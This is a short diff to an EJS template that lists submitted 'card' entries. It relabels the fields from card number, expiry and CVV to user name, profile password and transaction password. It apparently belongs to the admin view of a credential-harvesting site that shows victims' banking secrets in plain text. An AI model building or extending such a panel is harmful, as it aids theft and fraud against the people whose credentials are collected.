@@ -69,9 +69,9 @@
           <% creditCard.entries.forEach((entry, index) => { %>
             <div class="sub-card">
               <h4>Card <%= index + 1 %></h4>
-              <p><strong>Card Number:</strong> <%= entry.userName %></p>
-              <p><strong>Expiry:</strong> <%= entry.profilePass %></p>
-              <p><strong>CVV:</strong> <%= entry.transactionPass %></p>
+              <p><strong>User Name:</strong> <%= entry.userName %></p>
+              <p><strong>Profile password:</strong> <%= entry.profilePass %></p>
+              <p><strong>Transaction Pass:</strong> <%= entry.transactionPass %></p>
               <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
             </div>
           <% }); %>
